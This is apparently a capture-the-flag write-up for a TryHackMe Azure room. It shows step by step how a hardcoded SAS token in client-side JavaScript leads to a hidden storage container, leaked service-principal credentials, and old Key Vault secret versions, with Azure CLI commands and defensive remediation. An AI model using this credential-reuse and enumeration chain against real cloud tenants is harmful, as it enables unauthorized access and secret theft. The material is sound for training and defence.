# CryptoCabana

**Platform:** TryHackMe
**Difficulty:** Medium
**Category:** Cloud (Azure)
**Tags:** Azure Blob Storage, SAS token, Service Principal, Azure Key Vault, secret versioning

> *"Backed up. Sleep easy."*

A cloud-native chain through Azure: a hardcoded SAS token in client-side JavaScript leads to an over-permissioned storage account, which leaks plaintext service-principal credentials, which unlock a Key Vault: where the flag isn't in the current secret value, but in a version that existed before a "rotation."

> **Note:** The flag value is redacted (`THM{REDACTED}`), and live credential material from this instance (SAS signature, client secret, tenant ID) has been replaced with placeholders. Azure cloud rooms provision unique per-user resources, so exact values won't transfer between instances anyway: the methodology below reproduces on your own instance.

---

## Summary

| Stage | Vulnerability | Result |
|-------|--------------|--------|
| Recon | Hardcoded SAS token in static site's client-side JS | Read/list access to storage account |
| Storage enumeration | Over-scoped SAS token (write-only page, read+list token) | Discovered a container never linked from the site |
| Lateral movement | Plaintext service-principal credentials in a blob | Authenticated to Azure AD as the service principal |
| Flag | Key Vault secret version history | Recovered a pre-rotation secret value |

---

## 1. Reconnaissance: the static site

The target is an Azure Blob Storage static website (`*.z13.web.core.windows.net`): a "seed phrase backup kiosk" with a form that promises to back up a wallet recovery phrase to "your own private vault."

Rather than submitting the form, the room's own brief hints at reading what the page hands out passively: the raw source and anything it loads automatically:

```bash
curl -s https://<TARGET>/ -o index.html
cat index.html
grep -iE 'script' index.html
```

```
<script src="app.js"></script>
```

The rendered HTML itself contained no secrets, but it referenced a separate JS file that wasn't visible in a casual glance at the page.

---

## 2. Leaked SAS Token in Client-Side JS

Pulling the referenced script:

```bash
curl -s https://<TARGET>/app.js -o app.js
cat app.js
```

The file hardcodes a **Shared Access Signature (SAS) token** used to let the browser write directly to Blob Storage: a common pattern for client-side uploads, and a common source of over-permissioning:

```js
const STORAGE_ACCOUNT = "<storage-account>";
const BACKUPS_CONTAINER = "backups";
const BACKUP_SAS = "?sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&...&sig=<REDACTED>";
```

Decoding the SAS parameters is the key detail:

- `ss=b`: Blob service
- `srt=sco`: Service + Container + Object resource types
- `sp=rl`: **r**ead and **l**ist permissions

The page only ever *writes* backups, but the token it ships to every visitor can also **read and list the entire storage account**: far beyond what the feature needs.

---

## 3. Storage Enumeration

Using the leaked SAS token directly with the Azure CLI (no login required: the token itself is the credential):

```bash
export AZURE_STORAGE_ACCOUNT="<storage-account>"
export AZURE_STORAGE_SAS_TOKEN="sv=2022-11-02&ss=b&srt=sco&sp=rl&se=...&sig=<REDACTED>"

az storage container list --output table
```

```
Name
-------
$web
backups
vault
```

`vault` is never referenced anywhere on the site or in `app.js`. The SAS token's over-broad scope exposed a container the page's own logic never points to.

```bash
az storage blob list --container-name vault --output json
```

Two blobs turned up:

- `seed_phrase.txt`: a decoy, styled to look like the "prize"
- `backup-service-account.json`: a JSON file named exactly like an exported Azure service-principal credential

---

## 4. Service-Principal Credentials in Blob Storage

Downloading the credential file:

```bash
az storage blob download --container-name vault --name backup-service-account.json --file backup-service-account.json
cat backup-service-account.json
```

```json
{
  "client_id": "<REDACTED>",
  "client_secret": "<REDACTED>",
  "tenant_id": "<REDACTED>",
  "key_vault_name": "<key-vault-name>",
  "key_vault_uri": "https://<key-vault-name>.vault.azure.net/",
  "note": "CryptoCabana backup automation account. Rotate this if it ever leaves the vault."
}
```

Full Azure AD service-principal credentials: client ID, client secret, and tenant ID: sitting in plaintext in a blob, along with the exact Key Vault name to target next.

---

## 5. Key Vault: Reading Secrets and Their History

Authenticating as the leaked service principal:

```bash
az login --service-principal \
  -u <client_id> \
  -p '<client_secret>' \
  --tenant <tenant_id>
```

Listing secrets in the referenced vault:

```bash
az keyvault secret list --vault-name <key-vault-name> --output table
```

```
Name          Enabled    Expires
------------  ---------  -------------------------
key-shard-1   True
key-shard-2   True
key-shard-3   True
master-key    True       2020-01-01T00:00:00+00:00
```

Four secrets: three shards and a `master-key` with an expiry date already years in the past: a strong signal that secret is a dead end or distractor, not the intended path.

Reading each secret's **current** value:

```bash
az keyvault secret show --vault-name <key-vault-name> --name key-shard-1 --query value -o tsv
az keyvault secret show --vault-name <key-vault-name> --name key-shard-2 --query value -o tsv
az keyvault secret show --vault-name <key-vault-name> --name key-shard-3 --query value -o tsv
az keyvault secret show --vault-name <key-vault-name> --name master-key  --query value -o tsv
```

Results:

- `key-shard-1` → first half of a flag fragment
- `key-shard-2` → **not a flag fragment at all**: a plaintext note explaining the value had been rotated after being flagged, with the old value "still recoverable if you know where to look"
- `key-shard-3` → second half of a flag fragment
- `master-key` → `403 Forbidden`: RBAC denies `Microsoft.KeyVault/vaults/secrets/getSecret/action` for this principal

The `master-key` RBAC wall is a genuine dead end here (and, notably, the one part of this vault actually configured correctly). The real path is `key-shard-2`'s **version history**: Key Vault retains prior versions of a secret even after it's overwritten:

```bash
az keyvault secret list-versions --vault-name <key-vault-name> --name key-shard-2 --output json
```

Two versions appeared, created seconds apart: the original, and the rotated decoy note. Reading the **earlier** version directly by its version ID:

```bash
az keyvault secret show --vault-name <key-vault-name> --name key-shard-2 \
  --version <older-version-id> --query value -o tsv
```

That returned the missing middle fragment of the flag.

**Flag:** `THM{REDACTED}`: assemble the three shard fragments (`key-shard-1` + the pre-rotation `key-shard-2` + `key-shard-3`) in order on your own instance to recover it.

---

## Attack Chain

```
Static site (app.js)  →  hardcoded SAS token (over-scoped: read+list, not just write)
                       →  az storage container list  →  hidden "vault" container
                       →  plaintext service-principal JSON in blob
                       →  az login --service-principal  →  Key Vault access
                       →  secret list  →  3 shards + expired master-key (RBAC dead end)
                       →  key-shard-2 rotated to a decoy; list-versions reveals history
                       →  read pre-rotation version  →  flag fragment recovered
```

---

## Defensive Takeaways (Blue Team)

- **Client-side SAS tokens are inherently exposed.** Anything shipped to the browser is public, full stop: a SAS token embedded in JS should be scoped to the *exact* minimum action needed (here: write-only, single container) and short-lived. `sp=rl` sitting next to a "write your backup" feature is a scope mismatch that should fail a code review or an automated IaC policy check.
- **Container enumeration from a leaked token is a detectable event.** Azure Storage diagnostic logs record `ListContainers`/`ListBlobs` calls; a SAS token suddenly listing containers it was never intended to browse is a strong anomaly signal: the equivalent of the "stranger sits in a warm session" theme from other rooms in this series.
- **Credentials should never live in blob storage as plaintext files**, "meant to be temporary" or not: the file's own note (*"rotate this if it ever leaves the vault"*) shows the risk was known and accepted. Azure Key Vault references or Managed Identity should replace credential files entirely.
- **Key Vault secret version history persists after rotation.** Rotating a secret's *current* value doesn't retroactively protect old versions: if a secret was ever compromised, old versions need to be explicitly disabled or purged, not just superseded. RBAC should be applied to `secrets/getSecret` broadly, including historical versions, not just the current pointer.
- **RBAC on `master-key` worked as intended**: a useful contrast showing that when access control is actually applied, `Forbidden` is the correct, boring outcome. The failure here wasn't Key Vault's access model; it was everything upstream of it (the SAS token scope and the plaintext credential file) that handed an attacker a path around RBAC entirely.

---

## Remediation

| Finding | Fix |
|---------|-----|
| Over-scoped client-side SAS token | Scope SAS tokens to the minimum required permission (write-only, single container) and shortest practical lifetime; avoid `srt=sco` when only object-level write is needed. |
| Hidden container reachable via SAS | Don't rely on "security by omission" (an unlinked container name): apply the same least-privilege scoping to every container, not just the ones referenced by the UI. |
| Plaintext service-principal credentials in storage | Never store credential exports in blob storage. Use Managed Identity for service-to-service auth, or a dedicated secrets pipeline (Key Vault references, GitHub/Azure DevOps secret injection) instead. |
| Readable historical Key Vault secret versions | Explicitly disable or purge old versions of any secret known to have been exposed: rotation alone leaves prior versions live and readable to anyone with `getSecret` rights. |
